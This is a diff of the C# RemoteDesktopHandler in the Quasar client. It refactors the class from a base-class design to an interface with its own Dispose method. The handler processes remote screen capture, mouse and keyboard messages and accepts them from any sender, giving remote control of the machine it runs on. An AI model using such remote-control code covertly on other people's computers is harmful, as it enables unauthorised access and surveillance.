@@ -1,5 +1,4 @@
 ﻿using Quasar.Client.Helper;
-using Quasar.Client.Networking;
 using Quasar.Common.Enums;
 using Quasar.Common.Messages;
 using Quasar.Common.Networking;
@@ -13,25 +12,18 @@ using System.Windows.Forms;
 
 namespace Quasar.Client.Messages
 {
-    public class RemoteDesktopHandler : MessageProcessorBase<object>
+    public class RemoteDesktopHandler : IMessageProcessor
     {
-        private readonly QuasarClient _client;
-
         private UnsafeStreamCodec _streamCodec;
 
-        public RemoteDesktopHandler(QuasarClient client) : base(false)
-        {
-            _client = client;
-        }
-
-        public override bool CanExecute(IMessage message) => message is GetDesktop ||
+        public bool CanExecute(IMessage message) => message is GetDesktop ||
                                                              message is DoMouseEvent ||
                                                              message is DoKeyboardEvent ||
                                                              message is GetMonitors;
 
-        public override bool CanExecuteFrom(ISender sender) => true;
+        public bool CanExecuteFrom(ISender sender) => true;
 
-        public override void Execute(ISender sender, IMessage message)
+        public void Execute(ISender sender, IMessage message)
         {
             switch (message)
             {
@@ -187,7 +179,16 @@ namespace Quasar.Client.Messages
             client.Send(new GetMonitorsResponse {Number = Screen.AllScreens.Length});
         }
 
-        protected override void Dispose(bool disposing)
+        /// <summary>
+        /// Disposes all managed and unmanaged resources associated with this message processor.
+        /// </summary>
+        public void Dispose()
+        {
+            Dispose(true);
+            GC.SuppressFinalize(this);
+        }
+
+        protected virtual void Dispose(bool disposing)
         {
             if (disposing)
             {
